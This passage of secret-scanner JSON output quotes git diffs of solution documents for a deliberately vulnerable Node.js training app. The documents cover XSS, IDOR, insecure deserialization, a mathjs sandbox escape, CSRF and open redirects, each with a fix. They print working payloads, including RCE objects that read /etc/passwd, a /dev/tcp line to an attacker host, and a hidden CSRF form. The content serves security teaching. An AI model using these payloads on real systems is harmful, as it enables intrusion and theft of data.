information for any user identified by id.\n+\n+http://127.0.0.1:9090/app/useredit\n+\n+**Vulnerable Code snippet**\n+\n+*core/apphandler.js*\n+```\n+...\n+module.exports.userEditSubmit = function(req,res){\n+    if(req.body.password==req.body.cpassword){\n+        db.User.find({where:{'id':req.body.id}}).then(user=>{\n+            if(user){\n+                user.password = bCrypt.hashSync(req.body.password, bCrypt.genSaltSync(10), null)\n+                user.save().then(function(){\n+...\n+```\n+\n+Simply changing the user id in the page can lead to exploitation.<br><br>\n+![idor1](/resources/idor1.png \"IDOR\")\n+\n+**Solution**\n+\n+A simple check can solve this issue\n+```\n+if (req.user.id == req.body.id)\n+ //do\n+else\n+ //dont\n+```\n+\n+In our case we can use passports user object at `req.user` for modifying user information\n+\n+**Fixes**\n+\n+Implemented in the following files\n+\n+- *core/appHandler.js*\n+\n+The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/\u001b[93medfe31c81e8594ac336b3fd3a558e174af9fe7b3\u001b[0m)\n+\n+**Recommendation**\n+\n+- Try to restrict your functions to maximum extent, White listing is always better than blacklisting\n+- Consider any user supplied information as untrusted and always validate user access by sessions\n+\n+**Reference**\n+\n+- <https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control>\n", 
    "reason": "High Entropy", 
    "stringsFound": [
        "1d10d266567a6b721bd368500838756e1cd7966b", 
        "edfe31c81e8594ac336b3fd3a558e174af9fe7b3"
    ]
}
{
    "branch": "sqlite", 
    "commit": "Removed docs from the SQLite branch\n", 
    "commitHash": "797ea8dd7cbc869acfb75940de7d9112935ba3a2", 
    "date": "2018-10-09 10:32:07", 
    "diff": "@@ -0,0 +1,65 @@\n+# Security Misconfiguration\n+\n+## Application sends Stack Trace\n+\n+![secmis1](/resources/secmis1.png \"Security Misconfiguration\")\n+An invalid input `XD` triggers a stack trace in the calculator endpoint at\n+\n+http://127.0.0.1:9090/app/calc\n+\n+The application was running in `DEVELOPMENT` mode and due to lack of error handling, it sent the stack trace with internal file locations and other potentially sensitive information.\n+\n+*/core/apphandler.js*\n+```\n+...\n+if(req.body.eqn){\n+    req.flash('result',mathjs.eval(req.body.eqn))\n+    res.render('app/calc')\n+...\n+```\n+\n+Additionally the issue occurs due to insecure NodeJS configuration that shows stack staces.\n+\n+**Solution**\n+\n+This particular issue can be solved by using a try catch exception handling\n+```\n+try{\n+    result = mathjs.eval(req.body.eqn)\n+}catch (err){\n+    result = 'Invalid Equation'\n+}\n+```\n+\n+But a bigger issue is the application running in development mode. Set **NODE_ENV** environment variable to `production`, this improves performance too!\n+\n+**Fixes**\n+\n+Implemented in the following files\n+\n+- *core/appHandler.js*\n+\n+The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/9b17e5ae55a6bf0ec8ba41c25956c26e6e62badd)\n+\n+## X-Powered-By header\n+\n+![powered-by](/resources/powered-by.png \"X-Powered-By\")\n+\n+The `X-Powered-By : Express` header is sent by default in every response and disabling this is a good way to prevent attackers from fingerprinting your application.\n+\n+**Solution**\n+\n+Disable it using  `app.disable('x-powered-by')` in express\n+\n+**Fixes**\n+\n+Implemented in the following files\n+\n+- *server.js*\n+\n+The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/e5810006cb91fb22bc6287f2dd67ba7c779d26fa)\n+\n+**Reference**\n+- <https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration>\n+- <https://expressjs.com/en/advanced/best-practice-security.html>\n+- <https://blog.risingstack.com/node-js-security-checklist/>\n\\ No newline at end of file\n", 
    "path": "docs/solution/a6-securty-misconfig.md", 
    "printDiff": "@@ -0,0 +1,65 @@\n+# Security Misconfiguration\n+\n+## Application sends Stack Trace\n+\n+![secmis1](/resources/secmis1.png \"Security Misconfiguration\")\n+An invalid input `XD` triggers a stack trace in the calculator endpoint at\n+\n+http://127.0.0.1:9090/app/calc\n+\n+The application was running in `DEVELOPMENT` mode and due to lack of error handling, it sent the stack trace with internal file locations and other potentially sensitive information.\n+\n+*/core/apphandler.js*\n+```\n+...\n+if(req.body.eqn){\n+    req.flash('result',mathjs.eval(req.body.eqn))\n+    res.render('app/calc')\n+...\n+```\n+\n+Additionally the issue occurs due to insecure NodeJS configuration that shows stack staces.\n+\n+**Solution**\n+\n+This particular issue can be solved by using a try catch exception handling\n+```\n+try{\n+    result = mathjs.eval(req.body.eqn)\n+}catch (err){\n+    result = 'Invalid Equation'\n+}\n+```\n+\n+But a bigger issue is the application running in development mode. Set **NODE_ENV** environment variable to `production`, this improves performance too!\n+\n+**Fixes**\n+\n+Implemented in the following files\n+\n+- *core/appHandler.js*\n+\n+The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/\u001b[93m9b17e5ae55a6bf0ec8ba41c25956c26e6e62badd\u001b[0m)\n+\n+## X-Powered-By header\n+\n+![powered-by](/resources/powered-by.png \"X-Powered-By\")\n+\n+The `X-Powered-By : Express` header is sent by default in every response and disabling this is a good way to prevent attackers from fingerprinting your application.\n+\n+**Solution**\n+\n+Disable it using  `app.disable('x-powered-by')` in express\n+\n+**Fixes**\n+\n+Implemented in the following files\n+\n+- *server.js*\n+\n+The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/\u001b[93me5810006cb91fb22bc6287f2dd67ba7c779d26fa\u001b[0m)\n+\n+**Reference**\n+- <https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration>\n+- <https://expressjs.com/en/advanced/best-practice-security.html>\n+- <https://blog.risingstack.com/node-js-security-checklist/>\n\\ No newline at end of file\n", 
    "reason": "High Entropy", 
    "stringsFound": [
        "9b17e5ae55a6bf0ec8ba41c25956c26e6e62badd", 
        "e5810006cb91fb22bc6287f2dd67ba7c779d26fa"
    ]
}
{
    "branch": "sqlite", 
    "commit": "Removed docs from the SQLite branch\n", 
    "commitHash": "797ea8dd7cbc869acfb75940de7d9112935ba3a2", 
    "date": "2018-10-09 10:32:07", 
    "diff": "@@ -0,0 +1,95 @@\n+# Cross-site Scripting\n+\n+![xss1](/resources/xss1.png \"XSS\")\n+with input *Inconspicuous Pizza&lt;script&gt;alert('Cookie:'+document.cookie)&lt;/script&gt;*\n+\n+## Reflected XSS in Search Query\n+\n+**Note: Chrome XSS Auditor may block XSS Attacks**\n+\n+A Cross-site scripting vulnerability exists in the following URL\n+\n+http://127.0.0.1:9090/app/products\n+\n+**Vulnerable Code snippet**\n+\n+*/views/app/products.ejs*\n+```\n+...\n+<% if (output&&output.searchTerm) { %>\n+    <p class=\"bg-success\">\n+        Listing products with <strong>search query: </strong> \n+        <%- output.searchTerm %>\n+...\n+```\n+\n+User supplied input is directly rendered as part of HTML response. This issue can be exploited to inject arbitrary scripting code to perform a Cross-site Scripting attack.\n+\n+**Solution**\n+\n+Ensure user supplied or any other untrusted data is not rendered as part of HTTP response without appropriate encoding. EJS escape output tag can be used to render this securely with appropriate encoding such as below\n+\n+```\n+<%= output.searchTerm %>\n+```\n+Notice the `=` symbol instead of `-`, which escapes the output. Note that this only prevents xss when the target for escaped output is in a html context. \n+\n+**Fixes**\n+\n+Implemented in the following files\n+\n+- *server.js*\n+- *views/app/products.ejs*\n+\n+The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/6acbb14b51df84d4c4986d95f8fa4e3a6d600e35)\n+\n+## Stored XSS in Product Listing\n+\n+Another XSS vulnerability exists in the same page, however at a different location. By supplying an input such as `<script>alert('xss')</script>`, we can verify the XSS\n+\n+**Vulnerable Code snippet**\n+\n+*/views/app/products.ejs*\n+```\n+...\n+<td><%- output.products[i].id %></td>\n+<td><%- output.products[i].name %></td>\n+<td><%- output.products[i].code %></td>\n+<td><%- output.products[i].tags %></td>\n+...\n+```\n+\n+**Solution**\n+\n+Enable output string encoding\n+```\n+...\n+<td><%= output.products[i].id %></td>\n+<td><%= output.products[i].name %></td>\n+<td><%= output.products[i].code %></td>\n+<td><%= output.products[i].tags %></td>\n+...\n+```\n+Notice the `=` symbol instead of `-`, which escapes the output. Note that this only prevents xss when the target for escaped output is in a html context. \n+\n+**Fixes**\n+\n+Implemented in the following files\n+\n+- *server.js*\n+- *views/app/products.ejs*\n+\n+The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/6acbb14b51df84d4c4986d95f8fa4e3a6d600e35)\n+\n+**Recommendation**\n+\n+- Use Security header `X-XSS-Protection` to prevent reflected XSS attacks\n+- Limit raw rendering to internal trusted data only. Do not disable output encoding for untrusted data coming from external sources\n+- Always validate user input and escape them wherever necessary\n+- Use cookies securely `httpOnly`, `secure` are enabled in `express-cookies`. Refer to [this](https://expressjs.com/en/advanced/best-practice-security.html)\n+- Use a Content Security policy for your application using a library like [helmet](https://www.npmjs.com/package/helmet)\n+\n+**Reference**\n+\n+- <https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)>\n+- <https://www.npmjs.com/package/xss-filters>\n", 
    "path": "docs/solution/a7-xss.md", 
    "printDiff": "@@ -0,0 +1,95 @@\n+# Cross-site Scripting\n+\n+![xss1](/resources/xss1.png \"XSS\")\n+with input *Inconspicuous Pizza&lt;script&gt;alert('Cookie:'+document.cookie)&lt;/script&gt;*\n+\n+## Reflected XSS in Search Query\n+\n+**Note: Chrome XSS Auditor may block XSS Attacks**\n+\n+A Cross-site scripting vulnerability exists in the following URL\n+\n+http://127.0.0.1:9090/app/products\n+\n+**Vulnerable Code snippet**\n+\n+*/views/app/products.ejs*\n+```\n+...\n+<% if (output&&output.searchTerm) { %>\n+    <p class=\"bg-success\">\n+        Listing products with <strong>search query: </strong> \n+        <%- output.searchTerm %>\n+...\n+```\n+\n+User supplied input is directly rendered as part of HTML response. This issue can be exploited to inject arbitrary scripting code to perform a Cross-site Scripting attack.\n+\n+**Solution**\n+\n+Ensure user supplied or any other untrusted data is not rendered as part of HTTP response without appropriate encoding. EJS escape output tag can be used to render this securely with appropriate encoding such as below\n+\n+```\n+<%= output.searchTerm %>\n+```\n+Notice the `=` symbol instead of `-`, which escapes the output. Note that this only prevents xss when the target for escaped output is in a html context. \n+\n+**Fixes**\n+\n+Implemented in the following files\n+\n+- *server.js*\n+- *views/app/products.ejs*\n+\n+The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/\u001b[93m\u001b[93m6acbb14b51df84d4c4986d95f8fa4e3a6d600e35\u001b[0m\u001b[0m)\n+\n+## Stored XSS in Product Listing\n+\n+Another XSS vulnerability exists in the same page, however at a different location. By supplying an input such as `<script>alert('xss')</script>`, we can verify the XSS\n+\n+**Vulnerable Code snippet**\n+\n+*/views/app/products.ejs*\n+```\n+...\n+<td><%- output.products[i].id %></td>\n+<td><%- output.products[i].name %></td>\n+<td><%- output.products[i].code %></td>\n+<td><%- output.products[i].tags %></td>\n+...\n+```\n+\n+**Solution**\n+\n+Enable output string encoding\n+```\n+...\n+<td><%= output.products[i].id %></td>\n+<td><%= output.products[i].name %></td>\n+<td><%= output.products[i].code %></td>\n+<td><%= output.products[i].tags %></td>\n+...\n+```\n+Notice the `=` symbol instead of `-`, which escapes the output. Note that this only prevents xss when the target for escaped output is in a html context. \n+\n+**Fixes**\n+\n+Implemented in the following files\n+\n+- *server.js*\n+- *views/app/products.ejs*\n+\n+The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/\u001b[93m\u001b[93m6acbb14b51df84d4c4986d95f8fa4e3a6d600e35\u001b[0m\u001b[0m)\n+\n+**Recommendation**\n+\n+- Use Security header `X-XSS-Protection` to prevent reflected XSS attacks\n+- Limit raw rendering to internal trusted data only. Do not disable output encoding for untrusted data coming from external sources\n+- Always validate user input and escape them wherever necessary\n+- Use cookies securely `httpOnly`, `secure` are enabled in `express-cookies`. Refer to [this](https://expressjs.com/en/advanced/best-practice-security.html)\n+- Use a Content Security policy for your application using a library like [helmet](https://www.npmjs.com/package/helmet)\n+\n+**Reference**\n+\n+- <https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)>\n+- <https://www.npmjs.com/package/xss-filters>\n", 
    "reason": "High Entropy", 
    "stringsFound": [
        "6acbb14b51df84d4c4986d95f8fa4e3a6d600e35", 
        "6acbb14b51df84d4c4986d95f8fa4e3a6d600e35"
    ]
}
{
    "branch": "sqlite", 
    "commit": "Removed docs from the SQLite branch\n", 
    "commitHash": "797ea8dd7cbc869acfb75940de7d9112935ba3a2", 
    "date": "2018-10-09 10:32:07", 
    "diff": "@@ -0,0 +1,69 @@\n+# Insecure Deserialization\n+\n+The `Legacy Bulk Import` feature at http://127.0.0.1:9090/app/bulkproducts?legacy=true does not securely deserialize the data thus allowing remote code execution.\n+\n+![jse1](/resources/jse1.png)\n+\n+To execute code we need to provide a serialized object to the server. The object (as shown below) in this case would be a function that uses the `child_process` library to invoke `bash -c -- \\\"cat /etc/passwd > /dev/tcp/attacker-ip/nc-port\\\"`. The function is made into an [Immediately Invoked function Expression (IIFE)](https://en.wikipedia.org/wiki/Immediately-invoked_function_expression) by adding `()` to the end of the function\n+\n+The following input will trigger the vulnerability\n+\n+```\n+{\"rce\":\"_$$ND_FUNC$$_function (){require('child_process').exec('id;cat /etc/passwd', function(error, stdout, stderr) { console.log(stdout) });}()\"}\n+```\n+\n+which is the serialized version of\n+\n+```\n+var y = {\n+ rce : function(){\n+ require('child_process').exec('id;cat /etc/passwd', function(error, stdout, stderr) { console.log(stdout) });\n+ }(),\n+}\n+```\n+\n+![jse2](/resources/jse2.png)\n+\n+**Vulnerable Code snippet**\n+\n+*core/appHandler.js*\n+```         \n+...\n+module.exports.bulkProductsLegacy = function (req,res){\n+\t// TODO: Deprecate this soon\n+\tif(req.files.products){\n+\t\tvar products = serialize.unserialize(req.files.products.data.toString('utf8'))\n+...\n+```\n+\n+**Solution**\n+\n+Since the required feature is to essentially parse a JSON, it can be parsed securely using `JSON.parse` instead.\n+\n+*core/appHandler.js*\n+```\n+...\n+module.exports.bulkProductsLegacy = function (req,res){\n+\t// TODO: Deprecate this soon\n+\tif(req.files.products){\n+\t\tvar products = JSON.parse(req.files.products.data.toString('utf8'))\n+...\n+```\n+\n+**Fixes**\n+\n+Implemented in the following files\n+\n+- *core/appHandler.js*\n+\n+The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/624a4ee88b3af804271d183f2921448851ddbfff)\n+\n+**Recommendation**\n+\n+- Use secure and recommended ways to implement application features\n+- Ensure that potentially vulnerable legacy features are't accessible\n+\n+**Reference**\n+\n+- <https://www.owasp.org/index.php/Top_10-2017_A8-Insecure_Deserialization>\n+- <https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/>\n\\ No newline at end of file\n", 
    "path": "docs/solution/a8-insecure-deserialization.md", 
    "printDiff": "@@ -0,0 +1,69 @@\n+# Insecure Deserialization\n+\n+The `Legacy Bulk Import` feature at http://127.0.0.1:9090/app/bulkproducts?legacy=true does not securely deserialize the data thus allowing remote code execution.\n+\n+![jse1](/resources/jse1.png)\n+\n+To execute code we need to provide a serialized object to the server. The object (as shown below) in this case would be a function that uses the `child_process` library to invoke `bash -c -- \\\"cat /etc/passwd > /dev/tcp/attacker-ip/nc-port\\\"`. The function is made into an [Immediately Invoked function Expression (IIFE)](https://en.wikipedia.org/wiki/Immediately-invoked_function_expression) by adding `()` to the end of the function\n+\n+The following input will trigger the vulnerability\n+\n+```\n+{\"rce\":\"_$$ND_FUNC$$_function (){require('child_process').exec('id;cat /etc/passwd', function(error, stdout, stderr) { console.log(stdout) });}()\"}\n+```\n+\n+which is the serialized version of\n+\n+```\n+var y = {\n+ rce : function(){\n+ require('child_process').exec('id;cat /etc/passwd', function(error, stdout, stderr) { console.log(stdout) });\n+ }(),\n+}\n+```\n+\n+![jse2](/resources/jse2.png)\n+\n+**Vulnerable Code snippet**\n+\n+*core/appHandler.js*\n+```         \n+...\n+module.exports.bulkProductsLegacy = function (req,res){\n+\t// TODO: Deprecate this soon\n+\tif(req.files.products){\n+\t\tvar products = serialize.unserialize(req.files.products.data.toString('utf8'))\n+...\n+```\n+\n+**Solution**\n+\n+Since the required feature is to essentially parse a JSON, it can be parsed securely using `JSON.parse` instead.\n+\n+*core/appHandler.js*\n+```\n+...\n+module.exports.bulkProductsLegacy = function (req,res){\n+\t// TODO: Deprecate this soon\n+\tif(req.files.products){\n+\t\tvar products = JSON.parse(req.files.products.data.toString('utf8'))\n+...\n+```\n+\n+**Fixes**\n+\n+Implemented in the following files\n+\n+- *core/appHandler.js*\n+\n+The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/\u001b[93m624a4ee88b3af804271d183f2921448851ddbfff\u001b[0m)\n+\n+**Recommendation**\n+\n+- Use secure and recommended ways to implement application features\n+- Ensure that potentially vulnerable legacy features are't accessible\n+\n+**Reference**\n+\n+- <https://www.owasp.org/index.php/Top_10-2017_A8-Insecure_Deserialization>\n+- <https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/>\n\\ No newline at end of file\n", 
    "reason": "High Entropy", 
    "stringsFound": [
        "624a4ee88b3af804271d183f2921448851ddbfff"
    ]
}
{
    "branch": "sqlite", 
    "commit": "Removed docs from the SQLite branch\n", 
    "commitHash": "797ea8dd7cbc869acfb75940de7d9112935ba3a2", 
    "date": "2018-10-09 10:32:07", 
    "diff": "@@ -0,0 +1,52 @@\n+# Using Components with Known Vulnerabilities\n+\n+## mathjs Remote Code Execution\n+\n+The version of mathjs(https://www.npmjs.com/package/mathjs) library used in the application has a remote code execution vulnerability that allows an attacker to run arbitrary code on the server. \n+\n+To understand how the exploit works, look at [this](https://capacitorset.github.io/mathjs/)\n+\n+The calculator implementation uses `mathjs.eval` to evaluate user input at\n+\n+http://127.0.0.1:9090/app/calc\n+\n+There is no input validation either, probably because it is going to be a maths equation which will contain symbols\n+\n+Malicious input that triggers command execution\n+```\n+cos.constructor(\"spawn_sync = process.binding('spawn_sync'); normalizeSpawnArguments = function(c,b,a){if(Array.isArray(b)?b=b.slice(0):(a=b,b=[]),a===undefined&&(a={}),a=Object.assign({},a),a.shell){const g=[c].concat(b).join(' ');typeof a.shell==='string'?c=a.shell:c='/bin/sh',b=['-c',g];}typeof a.argv0==='string'?b.unshift(a.argv0):b.unshift(c);var d=a.env||process.env;var e=[];for(var f in d)e.push(f+'='+d[f]);return{file:c,args:b,options:a,envPairs:e};};spawnSync = function(){var d=normalizeSpawnArguments.apply(null,arguments);var a=d.options;var c;if(a.file=d.file,a.args=d.args,a.envPairs=d.envPairs,a.stdio=[{type:'pipe',readable:!0,writable:!1},{type:'pipe',readable:!1,writable:!0},{type:'pipe',readable:!1,writable:!0}],a.input){var g=a.stdio[0]=util._extend({},a.stdio[0]);g.input=a.input;}for(c=0;c<a.stdio.length;c++){var e=a.stdio[c]&&a.stdio[c].input;if(e!=null){var f=a.stdio[c]=util._extend({},a.stdio[c]);isUint8Array(e)?f.input=e:f.input=Buffer.from(e,a.encoding);}}console.log(a);var b=spawn_sync.spawn(a);if(b.output&&a.encoding&&a.encoding!=='buffer')for(c=0;c<b.output.length;c++){if(!b.output[c])continue;b.output[c]=b.output[c].toString(a.encoding);}return b.stdout=b.output&&b.output[1],b.stderr=b.output&&b.output[2],b.error&&(b.error= b.error + 'spawnSync '+d.file,b.error.path=d.file,b.error.spawnargs=d.args.slice(1)),b;}\")();cos.constructor(\"return spawnSync('id').output[1]\")()\n+```\n+\n+Which results in this\n+![rce](/resources/rce.png \"Command Execution\")\n+\n+**Solution**\n+\n+Modify fixed version to compatible version in `package.json`\n+```\n+...\n+    \"flash\": \"^1.1.0\",\n+    \"mathjs\": \"^3.10.1\",   // Add ^ to install latest compatible version\n+    \"md5\": \"^2.2.1\",\n+...\n+```\n+\n+Now install the package again by running `npm install`\n+\n+**Fixes**\n+\n+Implemented in the following files\n+\n+- *package.json*\n+\n+The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/5f1a4ca4c8262419321c3790757ae8719d9676a7)\n+\n+**Recommendation**\n+\n+- Dependencies must be updated regularly, and preferably automatically. \n+- Solutions like [Snyk](https://snyk.io/) and [NSP](https://nodesecurity.io/) can regularly monitor your dependencies and alert you of any vulnerable dependencies.\n+\n+**Reference**\n+\n+- <https://www.owasp.org/index.php/Top_10-2017_A9-Using_Components_with_Known_Vulnerabilities>\n+- <https://blog.travis-ci.com/2017-04-20-continuous-security-snyk-travis-ci/>\n", 
    "path": "docs/solution/a9-using-components-with-known-vulnerability.md", 
    "printDiff": "@@ -0,0 +1,52 @@\n+# Using Components with Known Vulnerabilities\n+\n+## mathjs Remote Code Execution\n+\n+The version of mathjs(https://www.npmjs.com/package/mathjs) library used in the application has a remote code execution vulnerability that allows an attacker to run arbitrary code on the server. \n+\n+To understand how the exploit works, look at [this](https://capacitorset.github.io/mathjs/)\n+\n+The calculator implementation uses `mathjs.eval` to evaluate user input at\n+\n+http://127.0.0.1:9090/app/calc\n+\n+There is no input validation either, probably because it is going to be a maths equation which will contain symbols\n+\n+Malicious input that triggers command execution\n+```\n+cos.constructor(\"spawn_sync = process.binding('spawn_sync'); normalizeSpawnArguments = function(c,b,a){if(Array.isArray(b)?b=b.slice(0):(a=b,b=[]),a===undefined&&(a={}),a=Object.assign({},a),a.shell){const g=[c].concat(b).join(' ');typeof a.shell==='string'?c=a.shell:c='/bin/sh',b=['-c',g];}typeof a.argv0==='string'?b.unshift(a.argv0):b.unshift(c);var d=a.env||process.env;var e=[];for(var f in d)e.push(f+'='+d[f]);return{file:c,args:b,options:a,envPairs:e};};spawnSync = function(){var d=normalizeSpawnArguments.apply(null,arguments);var a=d.options;var c;if(a.file=d.file,a.args=d.args,a.envPairs=d.envPairs,a.stdio=[{type:'pipe',readable:!0,writable:!1},{type:'pipe',readable:!1,writable:!0},{type:'pipe',readable:!1,writable:!0}],a.input){var g=a.stdio[0]=util._extend({},a.stdio[0]);g.input=a.input;}for(c=0;c<a.stdio.length;c++){var e=a.stdio[c]&&a.stdio[c].input;if(e!=null){var f=a.stdio[c]=util._extend({},a.stdio[c]);isUint8Array(e)?f.input=e:f.input=Buffer.from(e,a.encoding);}}console.log(a);var b=spawn_sync.spawn(a);if(b.output&&a.encoding&&a.encoding!=='buffer')for(c=0;c<b.output.length;c++){if(!b.output[c])continue;b.output[c]=b.output[c].toString(a.encoding);}return b.stdout=b.output&&b.output[1],b.stderr=b.output&&b.output[2],b.error&&(b.error= b.error + 'spawnSync '+d.file,b.error.path=d.file,b.error.spawnargs=d.args.slice(1)),b;}\")();cos.constructor(\"return spawnSync('id').output[1]\")()\n+```\n+\n+Which results in this\n+![rce](/resources/rce.png \"Command Execution\")\n+\n+**Solution**\n+\n+Modify fixed version to compatible version in `package.json`\n+```\n+...\n+    \"flash\": \"^1.1.0\",\n+    \"mathjs\": \"^3.10.1\",   // Add ^ to install latest compatible version\n+    \"md5\": \"^2.2.1\",\n+...\n+```\n+\n+Now install the package again by running `npm install`\n+\n+**Fixes**\n+\n+Implemented in the following files\n+\n+- *package.json*\n+\n+The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/\u001b[93m5f1a4ca4c8262419321c3790757ae8719d9676a7\u001b[0m)\n+\n+**Recommendation**\n+\n+- Dependencies must be updated regularly, and preferably automatically. \n+- Solutions like [Snyk](https://snyk.io/) and [NSP](https://nodesecurity.io/) can regularly monitor your dependencies and alert you of any vulnerable dependencies.\n+\n+**Reference**\n+\n+- <https://www.owasp.org/index.php/Top_10-2017_A9-Using_Components_with_Known_Vulnerabilities>\n+- <https://blog.travis-ci.com/2017-04-20-continuous-security-snyk-travis-ci/>\n", 
    "reason": "High Entropy", 
    "stringsFound": [
        "5f1a4ca4c8262419321c3790757ae8719d9676a7"
    ]
}
{
    "branch": "sqlite", 
    "commit": "Removed docs from the SQLite branch\n", 
    "commitHash": "797ea8dd7cbc869acfb75940de7d9112935ba3a2", 
    "date": "2018-10-09 10:32:07", 
    "diff": "@@ -0,0 +1,47 @@\n+# Cross-site Request Forgery\n+\n+## CSRF in Add/Edit product, User Edit\n+\n+The application is vulnerable to a Cross-sites-Request-Forgery in `Product Management` feature. The application fails to implement anti-CSRF token to prevent forced browsing.\n+\n+http://127.0.0.1:9090/app/modifyproduct\n+\n+http://127.0.0.1:9090/app/useredit\n+\n+This issue can be exploited by an attacker by hosting a malicious page like the one below and tricking the victim onto visiting it. The below example will add a new product on behalf of the victim on visiting a crafted URL like `http://youtube.com.xyz.nxd/watch/v=cute-kitten` by the attacker\n+\n+*Attacker's Webpage*\n+```html\n+<html>\n+    <body onload='document.hidden_form.submit()'>\n+        <form name=\"hidden_form\" method=\"POST\" action=\"http://127.0.0.1:9090/app/modifyproduct\">\n+            <input type=\"hidden\" name=\"name\" value=\"Hacked\">\n+            <input type=\"hidden\" name=\"code\" value=\"hacked\">\n+            <input type=\"hidden\" name=\"tags\" value=\"hack\">\n+            <input type=\"hidden\" name=\"description\" value=\"This is a hacked product\">\n+        </form>\n+    </body>\n+</html>\n+```\n+\n+**Solution**\n+\n+CSRF vulnerabilities can be fixed by ensuring anti-CSRF tokens are needed for successful form submission. \n+\n+This can be done by using a module like [csurf](https://www.npmjs.com/package/csurf), and can save time needed to correctly implement your own logic.\n+\n+**Fixes**\n+\n+Implemented in the following files\n+\n+- *routes/app.js*\n+- *core/appHandler.js*\n+- *views/app/modifyproducts.ejs*\n+- *views/app/useredit.ejs*\n+\n+The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/2c88ab87f19a9d124c925d33f346ec3897038eea)\n+\n+**Reference**\n+\n+- https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)\n+- https://github.com/expressjs/csurf\n\\ No newline at end of file\n", 
    "path": "docs/solution/ax-csrf.md", 
    "printDiff": "@@ -0,0 +1,47 @@\n+# Cross-site Request Forgery\n+\n+## CSRF in Add/Edit product, User Edit\n+\n+The application is vulnerable to a Cross-sites-Request-Forgery in `Product Management` feature. The application fails to implement anti-CSRF token to prevent forced browsing.\n+\n+http://127.0.0.1:9090/app/modifyproduct\n+\n+http://127.0.0.1:9090/app/useredit\n+\n+This issue can be exploited by an attacker by hosting a malicious page like the one below and tricking the victim onto visiting it. The below example will add a new product on behalf of the victim on visiting a crafted URL like `http://youtube.com.xyz.nxd/watch/v=cute-kitten` by the attacker\n+\n+*Attacker's Webpage*\n+```html\n+<html>\n+    <body onload='document.hidden_form.submit()'>\n+        <form name=\"hidden_form\" method=\"POST\" action=\"http://127.0.0.1:9090/app/modifyproduct\">\n+            <input type=\"hidden\" name=\"name\" value=\"Hacked\">\n+            <input type=\"hidden\" name=\"code\" value=\"hacked\">\n+            <input type=\"hidden\" name=\"tags\" value=\"hack\">\n+            <input type=\"hidden\" name=\"description\" value=\"This is a hacked product\">\n+        </form>\n+    </body>\n+</html>\n+```\n+\n+**Solution**\n+\n+CSRF vulnerabilities can be fixed by ensuring anti-CSRF tokens are needed for successful form submission. \n+\n+This can be done by using a module like [csurf](https://www.npmjs.com/package/csurf), and can save time needed to correctly implement your own logic.\n+\n+**Fixes**\n+\n+Implemented in the following files\n+\n+- *routes/app.js*\n+- *core/appHandler.js*\n+- *views/app/modifyproducts.ejs*\n+- *views/app/useredit.ejs*\n+\n+The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/\u001b[93m2c88ab87f19a9d124c925d33f346ec3897038eea\u001b[0m)\n+\n+**Reference**\n+\n+- https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)\n+- https://github.com/expressjs/csurf\n\\ No newline at end of file\n", 
    "reason": "High Entropy", 
    "stringsFound": [
        "2c88ab87f19a9d124c925d33f346ec3897038eea"
    ]
}
{
    "branch": "sqlite", 
    "commit": "Removed docs from the SQLite branch\n", 
    "commitHash": "797ea8dd7cbc869acfb75940de7d9112935ba3a2", 
    "date": "2018-10-09 10:32:07", 
    "diff": "@@ -0,0 +1,42 @@\n+# Unvalidated Redirects and Forwards\n+\n+The application fails to perform any validation before redirecting user to external URL based on untrusted user supplied data in the `redirect` function accessible at \n+\n+http://127.0.0.1:9090/app/redirect?url=\n+\n+**Vulnerable Code snippet**\n+\n+*/core/apphandler.js*\n+```\n+...\n+module.exports.redirect = function(req,res){\n+    if(req.query.url){\n+        res.redirect(req.query.url)\n+    }else{\n+        res.send('invalid redirect url')\n+    }\n+}\n+...\n+```\n+\n+An attacker can exploit this vulnerability using an URL such as below:\n+\n+```\n+http://127.0.0.1:9090/redirect.action?url=http://www.attacker.nxd/phising_page\n+```\n+\n+**Solution**\n+\n+Use an interceptor page which requires user approval before external redirection\n+\n+**Fixes**\n+\n+Implemented in the following files\n+\n+- *views/app/redirect.ejs*\n+- *core/appHandler.js*\n+\n+The fix has been implemented in this [commit](https://github.com/appsecco/dvna/commit/0df0980a19778e0cf627cd09b365e3e84023cf75)\n+\n+**Reference**\n+- https://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet\n\\ No newline at end of file\n", 
    "path": "docs/solution/ax-unvalidated-redirects-and-forwards.md", 
